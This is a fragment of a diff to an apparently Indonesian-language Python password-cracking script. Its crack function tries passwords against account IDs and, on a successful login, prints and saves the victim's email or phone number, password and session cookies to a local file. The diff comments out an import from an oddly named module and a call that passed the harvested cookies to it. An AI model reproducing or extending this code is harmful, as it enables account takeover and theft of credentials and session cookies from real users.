@@ -4,7 +4,7 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from time import sleep as turu
 from rich import print as cetak
 from rich.panel import Panel as nel
-from wcekxqdujagpaaznoragefhgy import chek_aplikasi
+#from wcekxqdujagpaaznoragefhgy import chek_aplikasi
 id,id2,uid = [],[],[]
 pwpluss = []
 pwnya = []
@@ -355,7 +355,7 @@ def crack(idf,pwx):
 			             print('')
 			             cok = ";".join([f"{c['name']}={c['value']}" for c in po.json()['session_cookies']])
 			             cetak(nel(f'\r {w}[{c}BERHASIL LOGIN{w}]{w}\n TAHUN BUAT: {w}{g}{cektahun(idf)}{w}\n{w} GMAIL/NO: {g}{idf}{w}\n {w}PASSWORD: {g}{pw}{w}\n {w}COOKIEE: {g}{cok}{w}\n {w}USER AGENT: {g}{ua}{w}'))
-			             chek_aplikasi(cok)
+			             #chek_aplikasi(cok)
 			             open('/storage/emulated/0/FIRZAH/OK/'+okh,'a').write(idf+'|'+pw+'|'+cok+'\n')
 			             break
 				
